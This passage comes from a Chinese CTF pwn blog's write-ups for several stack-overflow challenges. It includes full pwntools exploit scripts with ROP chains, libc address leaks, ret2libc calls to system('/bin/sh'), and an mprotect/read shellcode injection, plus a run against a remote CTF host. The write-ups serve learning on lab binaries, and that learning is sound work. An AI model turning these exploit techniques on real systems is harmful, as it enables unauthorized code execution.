// [rsp+0h] [rbp-50h] __int16 v3; // [rsp+30h] [rbp-20h] memset(s, 0, sizeof(s)); v3 = 0; puts(&quot;Input your Plaintext to be encrypted&quot;); gets(s); while ( 1 ) &#123; v0 = (unsigned int)x; if ( v0 &gt;= strlen(s) ) break; if ( s[x] &lt;= 96 || s[x] &gt; 122 ) &#123; if ( s[x] &lt;= 64 || s[x] &gt; 90 ) &#123; if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 ) s[x] ^= 0xFu; &#125; else &#123; s[x] ^= 0xEu; &#125; &#125; else &#123; s[x] ^= 0xDu; &#125; ++x; &#125; puts(&quot;Ciphertext&quot;); return puts(s);&#125; 按我的感觉 在我们布局好之后 我们会劫持gets的返回地址 那么并不会进入到while里 然而事实上 布局好了之后还是会输出Ciphertext 123456payload = &#x27;a&#x27; * 0x58payload += p64(pop_rdi_addr)payload += p64(libc_start_main_got)payload += p64(puts_plt)payload += p64(start_addr)#具体为什么这样布局后面说 那就不知道了 可能那个gets是在while里面的吧 那只能当作会进到while里面了 那么需要用\\x00进行截断 导致len&#x3D;0 逃逸异或 可能以后做这种题目保险都会加个\\x00了 并且还要注意 encrypt函数结束时还调用了puts(s) 虽然在他眼里s为空 但是他还会打印一个换行符 所以我们得这样 12sh.recvuntil(b&quot;Ciphertext\\\\\\\\n&quot;)sh.recvuntil(b&quot;\\\\\\\\n&quot;) 对于本题而言 我们需要泄漏libc_start_main的地址 也就是利用got表 当然利用函数是puts 这个函数在之前就已经经过plt调用了 这题主要是一些小细节 比如recvuntil sendlineafter 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *from LibcSearcher import LibcSearchersh = process(&quot;./ciscn_2019_c_1&quot;)#sh = remote(&quot;node4.buuoj.cn&quot;,28291)c_1 = ELF(&quot;./ciscn_2019_c_1&quot;)puts_plt = c_1.plt[&#x27;puts&#x27;]puts_got = c_1.got[&#x27;puts&#x27;]libc_start_main_got = c_1.got[&#x27;__libc_start_main&#x27;]start_addr = c_1.symbols[&#x27;_start&#x27;]main_addr = c_1.symbols[&#x27;main&#x27;]pop_rdi_addr = 0x0400c83ret = 0x4006b9sh.sendlineafter(&#x27;Input your choice&#x27;,b&#x27;1&#x27;)payload =&#x27;\\\\\\\\x00&#x27;payload += &#x27;a&#x27; * 0x57payload += p64(pop_rdi_addr)payload += p64(libc_start_main_got)payload += p64(puts_plt)payload += p64(start_addr)sh.recvuntil(b&quot;Input your Plaintext to be encrypted\\\\\\\\n&quot;)sh.sendline(payload)sh.recvuntil(b&quot;Ciphertext\\\\\\\\n&quot;)sh.recvuntil(b&quot;\\\\\\\\n&quot;)libc_start_main_addr = u64(sh.recvline()[:-1].ljust(8,b&#x27;\\\\\\\\0&#x27;))libc = LibcSearcher(&#x27;__libc_start_main&#x27;,libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&quot;str_bin_sh&quot;)payload = &#x27;\\\\\\\\x00&#x27;payload += &#x27;a&#x27; * 0x57payload += p64(ret)payload += p64(pop_rdi_addr)payload += p64(binsh_addr)payload += p64(system_addr)sh.sendlineafter(&#x27;Input your choice&#x27;,b&#x27;1&#x27;)sh.recvuntil(b&quot;Input your Plaintext to be encrypted\\\\\\\\n&quot;)sh.sendline(payload)sh.interactive() 还有一个问题就是栈平衡问 在最后调用system的时候 如果是Ubuntu18 那么需要考虑栈平衡问题 最后在padding之后要注意加1到2个ret 12$ ropgadget --binary &#x27;/Users/apple/Desktop/ciscn_2019_c_1&#x27; | grep ret0x00000000004006b9 : ret 还有一个问题就是关于传参了 对于32位而言 所需参数的传入是在返回地址之后的 俗称的栈传参 如下所示 1234payload = flat([&#x27;A&#x27; * 112, system_addr, 0xdeadbeef, binsh_addr])system_addr是构造需要执行的0xdeadbeef是随便的一个system_addr的返回地址 因为还需要一个参数传入binsh_addr相当于system_addr的参数 而对于64位而言 传入的首个参数为rdi寄存器 第二个是rsi寄存器 第三个是rdx寄存器 只有6个寄存器都满了之后 才会考虑使用栈传参 123456rdi, rsi, rdx, rcx, r8, r9payload = &#x27;a&#x27; * 0x58payload += p64(pop_rdi_addr)payload += p64(libc_start_main_got)payload += p64(puts_plt)payload += p64(start_addr) 然后是对输出处理 这时候体现了debug模式的重要性 也是在这里发现了有两个0x0a换行符 我们发现地址只有6个字节 但是我们u64需要8个 于是使用ljust(8,’\\0’)来补齐","categories":[{"name":"Stack/Basic","slug":"Stack-Basic","permalink":"https://dawoxiansigema.github.io/categories/Stack-Basic/"}],"tags":[]},{"title":"(Bss提权)GET_STARTED_3DSCTF_2016","slug":"GET-STARTED-3DSCTF-2016","date":"2023-10-31T14:12:58.000Z","updated":"2023-10-31T14:42:54.438Z","comments":true,"path":"2023/10/31/GET-STARTED-3DSCTF-2016/","link":"","permalink":"https://dawoxiansigema.github.io/2023/10/31/GET-STARTED-3DSCTF-2016/","excerpt":"值得好好记录并学习的一道题 三种做法三种难度","text":"值得好好记录并学习的一道题 三种做法三种难度 [bss提权]GET_STARTED_3DSCTF_2016审计12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+4h] [ebp-38h] printf(&quot;Qual a palavrinha magica? &quot;, v4); gets(&amp;v4); return 0;&#125; 在main函数中 得到的东西并不多 只能说存在gets的栈溢出可能 查看一下v4参数 12345-0000003C var_3C dd ?-00000038 var_38 db ?-00000037 db ? ; undefined-00000036 db ? ; undefined-00000035 db ? ; undefined 没有太多有用的地方 倒是看到了有个get_flag函数 123456789101112131415161718192021222324252627void __cdecl get_flag(int a1, int a2)&#123; int v2; // eax int v3; // esi unsigned __int8 v4; // al int v5; // ecx unsigned __int8 v6; // al if ( a1 == 814536271 &amp;&amp; a2 == 425138641 ) &#123; v2 = fopen(&quot;flag.txt&quot;, &quot;rt&quot;); v3 = v2; v4 = getc(v2); if ( v4 != 255 ) &#123; v5 = (char)v4; do &#123; putchar(v5); v6 = getc(v3); v5 = (char)v6; &#125; while ( v6 != 255 ); &#125; fclose(v3); &#125;&#125; 有个if判断 其实可以不要判断直接利用栈溢出 溢出后让eip指向此处fopen的地址 暴力溢出1234.text:080489B6 jnz short loc_8048A15.text:080489B8 mov [esp+0Ch+var_8], (offset aFileTooShort+0Ch) ; &quot;rt&quot;.text:080489C0 mov [esp+0Ch+var_C], offset aFlagTxt ; &quot;flag.txt&quot;.text:080489C7 call fopen 小细节 执行函数时 最后一步才是call执行 前面还需要加载参数堆栈 指向0x080489B8即可 12345678910111213141516171819pwndbg&gt; stack 5000:0000│ esp 0xffffd660 —▸ 0xffffd664 ◂— &#x27;dawoxiansigema&#x27;01:0004│ eax 0xffffd664 ◂— &#x27;dawoxiansigema&#x27;02:0008│ 0xffffd668 ◂— &#x27;xiansigema&#x27;03:000c│ 0xffffd66c ◂— &#x27;sigema&#x27;04:0010│ 0xffffd670 ◂— 0x800616d /* &#x27;ma&#x27; */05:0014│ 0xffffd674 ◂— &#x27;ineI&#x27;06:0018│ 0xffffd678 ◂— 0x007:001c│ 0xffffd67c ◂— 0x208:0020│ 0xffffd680 —▸ 0x80eb070 (__exit_funcs) —▸ 0x80ec2a0 (initial) ◂— 0x009:0024│ 0xffffd684 —▸ 0xffffd754 —▸ 0xffffd87a ◂— &#x27;/ctf/work/get_started_3dsctf_2016&#x27;0a:0028│ 0xffffd688 —▸ 0xffffd75c —▸ 0xffffd89c ◂— &#x27;LESSOPEN=| /usr/bin/lesspipe %s&#x27;0b:002c│ 0xffffd68c —▸ 0x804818c (_init) ◂— push ebx0c:0030│ 0xffffd690 —▸ 0x80eb00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8067c90 (__strcpy_sse2) ◂— mov edx, dword ptr [esp + 4]0d:0034│ 0xffffd694 ◂— &#x27;ineI&#x27;0e:0038│ 0xffffd698 ◂— 0x00f:003c│ 0xffffd69c —▸ 0x8048c6e (generic_start_main+542) ◂— add esp, 0x1010:0040│ 0xffffd6a0 ◂— 0x111:0044│ 0xffffd6a4 —▸ 0xffffd754 —▸ 0xffffd87a ◂— &#x27;/ctf/work/get_started_3dsctf_2016&#x27; 试图计算eax与ebp差值时发现 无法定位ebp位置 gdb并没有给出 12345678910111213140x8048a23 &lt;main+3&gt; mov dword ptr [esp], 0x80b… 0x8048a2a &lt;main+10&gt; call printf … 0x8048a2f &lt;main+15&gt; lea eax, [esp + 4] 0x8048a33 &lt;main+19&gt; mov dword ptr [esp], eax 0x8048a36 &lt;main+22&gt; call gets … ► 0x8048a3b &lt;main+27&gt; xor eax, eax 0x8048a3d &lt;main+29&gt; add esp, 0x3c 0x8048a40 &lt;main+32&gt; ret ↓ 0x8048c6e &lt;generic_start_main+542&gt; add esp, 0x10 0x8048c71 &lt;generic_start_main+545&gt; sub esp, 0xc 0x8048c74 &lt;generic_start_main+548&gt; push eax 看了眼寄存器 EBP的值始终是0 123*EBP 0x0*ESP 0xffffd660 —▸ 0xffffd664 ◂— &#x27;dawoxiansigema&#x27;*EIP 0x8048a3b (main+27) ◂— xor eax, eax 可是查看gets函数时 push和mov一样没少 123456.text:0804F630 ; __unwind &#123; // __gcc_personality_v0.text:0804F630 push ebp ; Alternative name is &#x27;_IO_gets&#x27;.text:0804F631 mov ebp, esp.text:0804F633 push edi.text:0804F634 push esi.text:0804F635 push ebx 原因出在main上 横向对比一下ctfwiki上面的ret2shellcode 123456789101112.text:0804852D main proc near ; DATA XREF: _start+17↑o.text:0804852D.text:0804852D s = byte ptr -64h.text:0804852D argc = dword ptr 8.text:0804852D argv = dword ptr 0Ch.text:0804852D envp = dword ptr 10h.text:0804852D.text:0804852D ; __unwind &#123;.text:0804852D push ebp.text:0804852E mov ebp, esp.text:08048530 and esp, 0FFFFFFF0h.text:08048533 add esp, 0FFFFFF80h ret2shellcode的main函数在一开始就对ebp进行了push操作导致我们在堆栈之后可以很容易找到main函数的返回地址 但是在这题就没有 123456789101112131415.text:08048A20 public main.text:08048A20 main proc near ; DATA XREF: _start+17↑o.text:08048A20.text:08048A20 var_3C = dword ptr -3Ch.text:08048A20 var_38 = byte ptr -38h.text:08048A20 argc = dword ptr 4.text:08048A20 argv = dword ptr 8.text:08048A20 envp = dword ptr 0Ch.text:08048A20.text:08048A20 sub esp, 3Ch.text:08048A23 mov [esp+3Ch+var_3C], offset aQualAPalavrinh ; &quot;Qual a palavrinha magica? &quot;.text:08048A2A call printf.text:08048A2F lea eax, [esp+3Ch+var_38].text:08048A33 mov [esp+3Ch+var_3C], eax.text:08048A36 call gets 只对了esp进行增长操作 并没有push ebp 所以ebp在进入下一个函数之前都是0 这点加深了我对栈溢出的认识 原来不是所有的函数调用栈都会有这个过程（顺带反思了一下自己为什么会有在gets内进行栈溢出的想法） 1char v4; // [esp+4h] [ebp-38h] 那也只能照着这个-38试一下 不然我也不会了 小细节 由于没有push ebp 所以填充38个之后就是返回地址 结果本地成功打通 当然为什么是本地是因为exit的原因 不过在暴力溢出的条件下是无法使用exit的 具体后面再说 当然这种直接暴力溢出的对于利用已有函数拿shell或者提权操作都是很香的 123456from pwn import *sh = process(&#x27;./get_started_3dsctf_2016&#x27;)context.log_level = &#x27;debug&#x27;target_addr = 0x080489B8sh.sendline(0x38 * &#x27;a&#x27;+p32(target_addr))sh.recv() 满足IF条件的溢出这里要补充一个点 以ctfwiki的ret2txt为例 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No system for you this time !!!&quot;); gets(&amp;s); strncpy(buf2, &amp;s, 0x64u); printf(&quot;bye bye ~&quot;); return 0;&#125; 这个是他的main函数 我们如果查看main的栈结构的话是这样的 12345678910111213-00000006 db ? ; undefined-00000005 db ? ; undefined-00000004 db ? ; undefined-00000003 db ? ; undefined-00000002 db ? ; undefined-00000001 db ? ; undefined+00000000 s db 4 dup(?)+00000004 r db 4 dup(?)+00000008 argc dd ?+0000000C argv dd ? ; offset+00000010 envp dd ? ; offset+00000014+00000014 ; end of stack variables 只截取了一点 上面的都是s的 r指的是ret地址 而后面的argc和argv指的是main()处的参数 也就是说传的参数位置在返回地址的高4个字节对于这块的栈结构可以简单描述为 1esp+缓存区+ebp+返回地址+参数(当然ebp不是必有的) 当然肯定有人有疑问 我们查看栈结构的时候 输入gets的值一直都在返回地址上方嘛 123456789101112131415161718192021222324252627282930313233343536373839pwndbg&gt; stack 5000:0000│ esp 0xffffd650 —▸ 0xffffd66c ◂— &#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama&#x27;01:0004│ 0xffffd654 ◂— 0x002:0008│ 0xffffd658 ◂— 0x103:000c│ 0xffffd65c ◂— 0x0... ↓ 2 skipped06:0018│ 0xffffd668 —▸ 0xf7ffd000 ◂— 0x2bf2407:001c│ eax 0xffffd66c ◂— &#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama&#x27;08:0020│ 0xffffd670 ◂— &#x27;baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama&#x27;09:0024│ 0xffffd674 ◂— &#x27;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama&#x27;0a:0028│ 0xffffd678 ◂— &#x27;daaaeaaafaaagaaahaaaiaaajaaakaaalaaama&#x27;0b:002c│ 0xffffd67c ◂— &#x27;eaaafaaagaaahaaaiaaajaaakaaalaaama&#x27;0c:0030│ 0xffffd680 ◂— &#x27;faaagaaahaaaiaaajaaakaaalaaama&#x27;0d:0034│ 0xffffd684 ◂— &#x27;gaaahaaaiaaajaaakaaalaaama&#x27;0e:0038│ 0xffffd688 ◂— &#x27;haaaiaaajaaakaaalaaama&#x27;0f:003c│ 0xffffd68c ◂— &#x27;iaaajaaakaaalaaama&#x27;10:0040│ 0xffffd690 ◂— &#x27;jaaakaaalaaama&#x27;11:0044│ 0xffffd694 ◂— &#x27;kaaalaaama&#x27;12:0048│ 0xffffd698 ◂— &#x27;laaama&#x27;13:004c│ edx-2 0xffffd69c ◂— 0x800616d /* &#x27;ma&#x27; */14:0050│ 0xffffd6a0 —▸ 0xf7fbd3fc (__exit_funcs) —▸ 0xf7fbe180 (initial) ◂— 0x015:0054│ 0xffffd6a4 ◂— 0x4000016:0058│ 0xffffd6a8 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f14 (_DYNAMIC) ◂— 0x117:005c│ 0xffffd6ac —▸ 0x8048722 (__libc_csu_init+82) ◂— add edi, 118:0060│ 0xffffd6b0 ◂— 0x119:0064│ 0xffffd6b4 —▸ 0xffffd774 —▸ 0xffffd898 ◂— &#x27;/ctf/work/ret2text&#x27;1a:0068│ 0xffffd6b8 —▸ 0xffffd77c —▸ 0xffffd8ab ◂— &#x27;LESSOPEN=| /usr/bin/lesspipe %s&#x27;1b:006c│ 0xffffd6bc —▸ 0xf7e06479 (__cxa_atexit+41) ◂— add esp, 0x1c1c:0070│ 0xffffd6c0 —▸ 0xf7fe22f0 ◂— endbr321d:0074│ 0xffffd6c4 ◂— 0x01e:0078│ 0xffffd6c8 —▸ 0x80486db (__libc_csu_init+11) ◂— add ebx, 0x19251f:007c│ 0xffffd6cc ◂— 0x020:0080│ 0xffffd6d0 —▸ 0xf7fbd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c21:0084│ 0xffffd6d4 —▸ 0xf7fbd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c22:0088│ ebp 0xffffd6d8 ◂— 0x023:008c│ 0xffffd6dc —▸ 0xf7decee5 (__libc_start_main+245) ◂— add esp, 0x1024:0090│ 0xffffd6e0 ◂— 0x125:0094│ 0xffffd6e4 —▸ 0xffffd774 —▸ 0xffffd898 ◂— &#x27;/ctf/work/ret2text&#x27;26:0098│ 0xffffd6e8 —▸ 0xffffd77c 这是因为 上方的字符可以理解为一个存储区 因为函数一开头就给了个char s 就是用来存储gets传来的参数的 事实大于雄辩 是不是这样写exp跑一下就知道了 1234567891011121314151617181920from pwn import *sh = process(&#x27;./get_started_3dsctf_2016&#x27;)context.log_level = &#x27;debug&#x27;target_addr = 0x080489A0sh.sendline(&#x27;a&#x27; * 0x38 + p32(target_addr) + &#x27;aaaa&#x27; + p32(0x308CD64F) + p32(0x195719D1))sh.recv()# &#x27;a&#x27;*0x38 = padding# p32(target_addr) = get_flag函数地址# &#x27;aaaa&#x27; = get_flag函数的返回地址 不过我们本地拿flag不需要仔细构造 随便就行# 后面俩p32是if里的俩参数[+] Starting local process &#x27;./get_started_3dsctf_2016&#x27;: pid 7724[DEBUG] Sent 0x49 bytes: 00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ * 00000030 61 61 61 61 61 61 61 61 a0 89 04 08 61 61 61 61 │aaaa│aaaa│····│aaaa│ 00000040 4f d6 8c 30 d1 19 57 19 0a │O··0│··W·│·│ 00000049[DEBUG] Received 0x2b bytes: &#x27;Qual a palavrinha magica? ffffllllaaaagggg\\\\\\\\n&#x27;[*] Stopped process &#x27;./get_started_3dsctf_2016&#x27; (pid 7724) 事实证明本地是可以打通的 只不过我们没有构造好get_flag的返回地址 导致程序是以一种错误的方式终止的 这样在靶机是不会有回显的 我们需要解决他 实际上也好解决 可以利用exit函数 而且他自带 12345678910.text:0804E6A0 public exit.text:0804E6A0 exit proc near ; CODE XREF: generic_start_main+225↑p.text:0804E6A0.text:0804E6A0 status = dword ptr 4.text:0804E6A0.text:0804E6A0 ; __unwind &#123;.text:0804E6A0 sub esp, 0Ch.text:0804E6A3 push 1 ; int.text:0804E6A5 push 1 ; int.text:0804E6A7 push 只需要把aaaa改为p32(0x0804E6A0)即可 12345678910[+] Opening connection to node4.buuoj.cn on port 29712: Done[DEBUG] Sent 0x49 bytes: 00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ * 00000030 61 61 61 61 61 61 61 61 a0 89 04 08 a0 e6 04 08 │aaaa│aaaa│····│····│ 00000040 4f d6 8c 30 d1 19 57 19 0a │O··0│··W·│·│ 00000049[DEBUG] Received 0x45 bytes: &#x27;Qual a palavrinha magica? flag&#123;c16165e1-3204-49b5-bd78-714d3aa7c575&#125;\\\\\\\\n&#x27;[*] Closed connection to node4.buuoj.cn port 29712 Mprotect暴力getshell首先是关于程序链接方式的问题 12root@85eeceab223d:/ctf/work# ldd get_started_3dsctf_2016 not a dynamic executable 程序分为静态、动态链接两种情况 对于静态链接的程序 据说是蛮大可能有Mprotect这个函数 1234int mprotect(void *addr, size_t len, int prot);addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB == 4096字节）整数倍。len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。取1000即可prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用 不过一般做题赋值7就行了 也就是说我们需要知道利用段的起始位置 我们先用vmmap查看一下程序地址段的权限情况 1234560x8048000 0x80ea000 r-xp a2000 0 /ctf/work/get_started_3dsctf_20160x80ea000 0x80ec000 rw-p 2000 a1000 /ctf/work/get_started_3dsctf_20160x80ec000 0x810f000 rw-p 23000 0 [heap]0xf7ff8000 0xf7ffc000 r--p 4000 0 [vvar]0xf7ffc000 0xf7ffe000 r-xp 2000 0 [vdso]0xfffdd000 0xffffe000 rw-p 21000 0 [stack] 后四个段先不动为好 可能会破坏栈结构导致异常退出 可以利用0x80ea000这个段 12345mprotect_addrret_addrbuf_addrbuf_sizebuf_prot 而我们调用只是修改了段落权限 想要getshell还需要往里写入数据 之前ctfwiki的ret2shellcode是因为gets直接把数据存入bss段 而此处我们需要人为指定数据段写入内容 1234ssize_t read (int fd, void *buf, size_t count);# fd设为0即可* buf为段开始地址# count为段长 我们可以利用read函数 将我们写好的shell写入我们刚刚给rwx权限的段 12345read_addrret_addrfd(赋0即可)buf_addrlen 只不过 mprotect进行传参时 我们需要在结束之后继续调用read函数 此时的栈结构大概是这个样子 3个参数我写在了一起 不然太麻烦了 12345678910111213141516171819202122| | +------------------+ | read_argv | +------------------+ | read_retaddr | +------------------+ | read | +------------------+ | mprotect_argv | +------------------+ | mprotetc_retaddr | +------------------+ | mprotect | +------------------+ | saved ebp | +------------------+ | | | | | | +------------------+ | | esp--&gt;+------------------+ 当执行完mprotect函数之后 EIP指向mprotetc_retaddr 然后跳转到这个地址继续执行程序 而每次的地址都不太一样 导致我们无法将mprotetc_retaddr处地址设置为read函数的地址 此时用到Ropdaget 1234567891011$ ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27; | grep pop0x0809e102 : pop ds ; pop ebx ; pop esi ; pop edi ; ret0x0809e0fa : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x080b91e6 : pop eax ; ret0x0804c56d : pop eax ; ret 0x80e0x080d9ff8 : pop eax ; ret 0xfff70x080dfcd8 : pop eax ; ret 0xfff90x0805bf3d : pop ebp ; pop ebx ; pop esi ; pop edi ; ret0x0809e4c5 : pop ebp ; pop esi ; pop edi ; ret0x080483ba : pop ebp ; ret0x080a25b9 : pop ebp ; ret 0x10 选取0x0809e4c5设为mprotect_retaddr的值 因为当mprotect执行完毕时 会清空栈空间 此时栈顶就是mprotect_addr 而此处值为0x0809e4c5 则会执行3次pop 将mprotect的3个参数出栈至寄存器 之后执行ret 在执行时 栈顶正是我们输入的read的函数地址 而执行ret则是将栈顶出栈至EIP寄存器 栈顶指针顺势+4 EIP设置后就会按计划执行read函数指令了 123456789101112131415161718192021222324252627282930from pwn import *context.log_level = &#x27;debug&#x27;#sh = remote(&#x27;node4.buuoj.cn&#x27;,29712)sh = process(&#x27;./get_started_3dsctf_2016&#x27;)mprotect_addr = 0x0806EC80buf_addr = 0x80ea000buf_size = 0x1000buf_prot = 0x7pop_3_ret = 0x0804f460read_addr = 0x0806E140payload = b&#x27;a&#x27; * 0x38payload += p32(mprotect_addr)payload += p32(pop_3_ret)payload += p32(buf_addr)payload += p32(buf_size)payload += p32(buf_prot)payload += p32(read_addr)payload += p32(buf_addr)payload += p32(0)payload += p32(buf_addr)payload += p32(0x100)sh.sendline(payload)shellcode = asm(shellcraft.sh())sh.sendline(shellcode)sh.interactive() 当然read函数执行完之后返回地址需要是我们设置权限的段地址 我们需要跳转到那来getshell","categories":[{"name":"Stack/Basic","slug":"Stack-Basic","permalink":"https://dawoxiansigema.github.io/categories/Stack-Basic/"}],"tags":[]},{"title":"(Libc泄露)OGeek2019_babyrop","slug":"OGeek2019-babyrop","date":"2023-10-31T14:11:42.000Z","updated":"2023-10-31T14:22:35.130Z","comments":true,"path":"2023/10/31/OGeek2019-babyrop/","link":"","permalink":"https://dawoxiansigema.github.io/2023/10/31/OGeek2019-babyrop/","excerpt":"其实这题也不难 但是做起来却磕磕碰碰的","text":"其实这题也不难 但是做起来却磕磕碰碰的 [Libc泄漏]OGeek2019_babyrop12345678910111213141516171819int __cdecl sub_804871F(int a1)&#123; size_t v1; // eax char s; // [esp+Ch] [ebp-4Ch] char buf[7]; // [esp+2Ch] [ebp-2Ch] unsigned __int8 v5; // [esp+33h] [ebp-25h] ssize_t v6; // [esp+4Ch] [ebp-Ch] memset(&amp;s, 0, 0x20u); memset(buf, 0, 0x20u); sprintf(&amp;s, &quot;%ld&quot;, a1); v6 = read(0, buf, 0x20u); buf[v6 - 1] = 0; v1 = strlen(buf); if ( strncmp(buf, &amp;s, v1) ) exit(0); write(1, &quot;Correct\\\\\\\\n&quot;, 8u); return v5;&#125; 首先我的ida有点问题 最后return的v5应该是buf[7] 其次对比一下之前的ciscn_2019_n_8 他的var数组是%d类型 而此时的buf是char类型 因此padding的时候不需要四个字母一组 1v6 = read(0, buf, 0x20u); 这一行的read作用和scanf相等 之前是没想到原来输入口在这 给了0x20的空间来输入buf[7] 对于strlen的长度判断可以用\\x00截断所以初步payload如下 12payload = &#x27;\\\\\\\\x00&#x27; + &#x27;a&#x27; * 7至于为什么\\\\\\\\x00后a是*7而不是6暂时还不清楚 这样才能绕过strncmp的比较 返回buf[7] 1234567891011ssize_t __cdecl sub_80487D0(char a1)&#123; ssize_t result; // eax char buf; // [esp+11h] [ebp-E7h] if ( a1 == 127 ) result = read(0, &amp;buf, 0xC8u); else result = read(0, &amp;buf, a1); return result;&#125; 返回的值作为参数传入这里 在这看到存在栈溢出可能 之前的buf就不要想了长度太短 这里我们至少需要0xe7+20左右 所以我们需要让a1尽可能大 也就是buf[7]尽可能大 所以buf[7]我们可以用\\xff(最大的ascii了) 12345678payload = &#x27;\\\\\\\\x00&#x27;payload += &#x27;b&#x27; * 6payload += &#x27;\\\\\\\\xff&#x27;sh.sendline(payload)sh.recvuntil(&quot;Correct\\\\\\\\n&quot;)payload1 = b&#x27;a&#x27;*0xe7+b&#x27;a&#x27;*4+p32(write_plt)+p32(0x08048825)+p32(1)+p32(write_got)+p32(4)sh.sendline(payload1) 至于为啥用write这么复杂 是因为之前用了puts跑不通 对于libc泄漏而言 这是write的标准格式 然后就是走流程了 123456789101112131415161718192021222324252627282930313233343536from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]sh = process(&#x27;./pwn&#x27;)#sh = remote(&#x27;node4.buuoj.cn&#x27;,28124)elf = ELF(&#x27;./pwn&#x27;)write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]#gdb.attach(sh)#2C = 44 20 = 32payload = &#x27;\\\\\\\\x00&#x27;payload += &#x27;b&#x27; * 6payload += &#x27;\\\\\\\\xff&#x27;sh.sendline(payload)sh.recvuntil(&quot;Correct\\\\\\\\n&quot;)payload1 = b&#x27;a&#x27;*0xe7+b&#x27;a&#x27;*4+p32(write_plt)+p32(0x08048825)+p32(1)+p32(write_got)+p32(4)sh.sendline(payload1)write_addr = u32(sh.recv(4))#print(hex(puts_addr))libc = LibcSearcher(&quot;write&quot;,write_addr)write_libc = libc.dump(&#x27;write&#x27;)base_addr = write_addr - write_libcsystem_addr = base_addr + libc.dump(&#x27;system&#x27;)binsh_addr = base_addr + libc.dump(&#x27;str_bin_sh&#x27;)payload2 = &#x27;b&#x27; * (0xe7+4) + p32(system_addr) + p32(0x08048825) + p32(binsh_addr)sh.sendline(payload)sh.recvuntil(&#x27;Correct\\\\\\\\n&#x27;)sh.sendline(payload2)sh.interactive() 不过得事先将这个so文件add到LibcSearcher一下","categories":[{"name":"Stack/Basic","slug":"Stack-Basic","permalink":"https://dawoxiansigema.github.io/categories/Stack-Basic/"}],"tags":[]},{"title":"(Libc泄露)HarekazeCTF2019_baby_rop2","slug":"HarekazeCTF2019-baby-rop2","date":"2023-10-31T14:09:59.000Z","updated":"2023-10-31T14:22:43.702Z","comments":true,"path":"2023/10/31/HarekazeCTF2019-baby-rop2/","link":"","permalink":"https://dawoxiansigema.github.io/2023/10/31/HarekazeCTF2019-baby-rop2/","excerpt":"主要记录一下recv后的处理以及一个特殊情况 题目很简单就是个libc泄漏","text":"主要记录一下recv后的处理以及一个特殊情况 题目很简单就是个libc泄漏 [Libc泄漏]HarekazeCTF2019_baby_rop2123456789101112131415int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax char buf[28]; // [rsp+0h] [rbp-20h] int v6; // [rsp+1Ch] [rbp-4h] setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); printf(&quot;What&#x27;s your name? &quot;, 0LL); v3 = read(0, buf, 0x100uLL); v6 = v3; buf[v3 - 1] = 0; printf(&quot;Welcome to the Pwn World again, %s!\\\\\\\\n&quot;, buf); return 0;&#125; 题目是这样的 很简单 123456789101112131415161718from pwn import *from LibcSearcher import *sh = process(&#x27;./babyrop2&#x27;)#sh = remote(&#x27;node4.buuoj.cn&#x27;,26141)elf = ELF(&#x27;./babyrop2&#x27;)context.log_level = &#x27;debug&#x27;#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]#gdb.attach(sh,&#x27;break *0x40069A&#x27;)printf_plt = elf.plt[&#x27;printf&#x27;]read_got = elf.got[&#x27;read&#x27;]main = 0x400636pop_rdi_ret = 0x400733pop_rsi_r15_ret = 0x400731payload = &#x27;a&#x27; * (0x20 + 0x8) + p64(pop_rdi_ret) + p64(0x400770) + p64(pop_rsi_r15_ret) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main)sh.sendlineafter(&quot;What&#x27;s your name?&quot;,payload)print sh.recv() 但是如果exp这样写的话 啥都收不到 应该是有个莫名其妙的换行符在 12345678910111213sh.recvuntil(&#x27;\\\\\\\\n&#x27;)print sh.recv()[DEBUG] Received 0x67 bytes: 00000000 57 65 6c 63 6f 6d 65 20 74 6f 20 74 68 65 20 50 │Welc│ome │to t│he P│ 00000010 77 6e 20 57 6f 72 6c 64 20 61 67 61 69 6e 2c 20 │wn W│orld│ aga│in, │ 00000020 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ 00000030 61 61 61 61 61 61 61 61 61 61 61 61 61 21 0a 57 │aaaa│aaaa│aaaa│a!·W│ 00000040 65 6c 63 6f 6d 65 20 74 6f 20 74 68 65 20 50 77 │elco│me t│o th│e Pw│ 00000050 6e 20 57 6f 72 6c 64 20 61 67 61 69 6e 2c 20 f0 │n 